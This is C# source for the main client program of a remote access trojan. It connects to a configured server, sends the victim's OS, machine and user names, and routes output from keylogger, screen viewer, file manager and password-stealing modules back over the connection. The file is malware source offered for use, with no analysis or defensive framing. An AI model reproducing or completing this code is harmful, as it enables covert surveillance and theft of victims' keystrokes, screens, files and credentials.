using System;
using System.Net.Sockets;
using System.Text;
using System.Web.Script.Serialization;
using System.Collections.Concurrent;
using System.Threading;
using RatClient.Config;
using RatClient.Features;

class Program
{
    #region Variables
    private Config config = new Config();
    static TcpClient client;
    static NetworkStream stream;
    static readonly string Server = Config.IP;
    static readonly int Port = Config.Port;
    static readonly int bufferSize = Config.BufferSize;
    static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();
    static AutoResetEvent messageEvent = new AutoResetEvent(false);
    static Thread sendThread;
    static readonly object streamLock = new object();
    #endregion

    #region Features
    static ScreenViewer screenViewer = new ScreenViewer(bufferSize, EnqueueJson);
    static KeyLogger keyLogger = new KeyLogger(EnqueueJson);
    static FileManager fileManager = new FileManager(EnqueueJson);
    static PasswordManager passwordManager = new PasswordManager(EnqueueJson);
    #endregion

    public delegate void MessageReceivedHandler(dynamic message);
    public static event MessageReceivedHandler MessageReceived;

    static void Main(string[] args)
    {
        try
        {
            client = new TcpClient(Server, Port);
            stream = client.GetStream();

            sendThread = new Thread(ProcessQueue);
            sendThread.Start();

            SendInfo();

            while (true)
            {
                byte[] data = new byte[bufferSize];
                int bytes = stream.Read(data, 0, data.Length);
                if (bytes == 0) break;
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);

                HandleResponse(responseJson);
                MessageReceived?.Invoke(responseJson);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception: {0}", e);
        }
        finally
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
            if (sendThread != null) sendThread.Abort();
        }

        Console.ReadKey();
    }

    static void HandleResponse(dynamic responseJson)
    {
        switch (responseJson["type"].ToString())
        {
            case "heartbeat":
                EnqueueJson(new { type = "heartbeat", text = "pong" });
                break;
        }
    }

    static void EnqueueJson(object jsonObject)
    {
        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
        messageQueue.Enqueue(jsonString);
        messageEvent.Set();
    }

    static void ProcessQueue()
    {
        while (true)
        {
            messageEvent.WaitOne();
            while (messageQueue.TryDequeue(out string jsonString))
            {
                byte[] data = Encoding.UTF8.GetBytes(jsonString);
                int bytesSent = 0;
                int bytesLeft = data.Length;

                lock (streamLock)
                {
                    while (bytesLeft > 0)
                    {
                        int chunkSize = Math.Min(bufferSize, bytesLeft);
                        stream.Write(data, bytesSent, chunkSize);
                        bytesSent += chunkSize;
                        bytesLeft -= chunkSize;
                    }
                }
            }
        }
    }

    static void SendInfo()
    {
        var osInfo = new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
        var jsonOSInfo = new
        {
            type = "system_info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = Environment.MachineName,
            user = Environment.UserName
        };
        EnqueueJson(jsonOSInfo);
    }
}